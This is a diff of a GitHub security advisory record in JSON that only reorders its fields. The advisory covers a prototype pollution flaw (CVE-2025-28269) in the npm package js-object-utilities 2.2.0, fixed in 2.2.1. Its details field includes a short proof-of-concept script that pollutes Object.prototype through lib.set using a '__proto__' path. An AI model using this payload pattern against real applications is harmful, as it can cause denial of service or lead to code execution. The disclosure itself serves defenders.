@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-hpqf-m68j-2pfx",
-  "summary": "js-object-utilities Vulnerable to Prototype Pollution",
-  "details": "**Vulnerability type:**\nPrototype Pollution\n\n**Affected Package:**\n* Product: js-object-utilities\n* Version: 2.2.0\n\n**Remedy:**\n\nUpdate package to version 2.2.1.\n\n**Vulnerability Location(s):**\n```js\nat module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)\n```\n\n**Description:**\n\nThe latest version of `js-object-utilities (2.2.0)`, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) `lib.set`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install js-object-utilities@2.2.0\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib = await import('js-object-utilities');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        Reflect.apply(lib.set, {}, [someObj, \"__proto__.pollutedKey\", 123]);\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n```\n\n**Reporter Credit:**\n\nTariq Hawis",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-hpqf-m68j-2pfx/GHSA-hpqf-m68j-2pfx.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "js-object-utilities",
+        "purl": "pkg:npm/js-object-utilities"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2025-28269"
   ],
-  "modified": "2025-04-14T22:42:17.534642Z",
-  "published": "2025-04-07T18:52:04Z",
   "database_specific": {
-    "nvd_published_at": null,
     "cwe_ids": [
       "CWE-1321"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2025-04-07T18:52:04Z"
+    "github_reviewed_at": "2025-04-07T18:52:04Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
   },
+  "details": "**Vulnerability type:**\nPrototype Pollution\n\n**Affected Package:**\n* Product: js-object-utilities\n* Version: 2.2.0\n\n**Remedy:**\n\nUpdate package to version 2.2.1.\n\n**Vulnerability Location(s):**\n```js\nat module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)\n```\n\n**Description:**\n\nThe latest version of `js-object-utilities (2.2.0)`, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) `lib.set`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install js-object-utilities@2.2.0\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib = await import('js-object-utilities');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        Reflect.apply(lib.set, {}, [someObj, \"__proto__.pollutedKey\", 123]);\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n```\n\n**Reporter Credit:**\n\nTariq Hawis",
+  "id": "GHSA-hpqf-m68j-2pfx",
+  "modified": "2025-04-14T22:42:17.534642Z",
+  "published": "2025-04-07T18:52:04Z",
   "references": [
     {
       "type": "WEB",
@@ -30,36 +54,12 @@
       "url": "https://github.com/rrainn/js-object-utilities"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "js-object-utilities",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/js-object-utilities"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "2.2.1"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-hpqf-m68j-2pfx/GHSA-hpqf-m68j-2pfx.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "js-object-utilities Vulnerable to Prototype Pollution"
 }
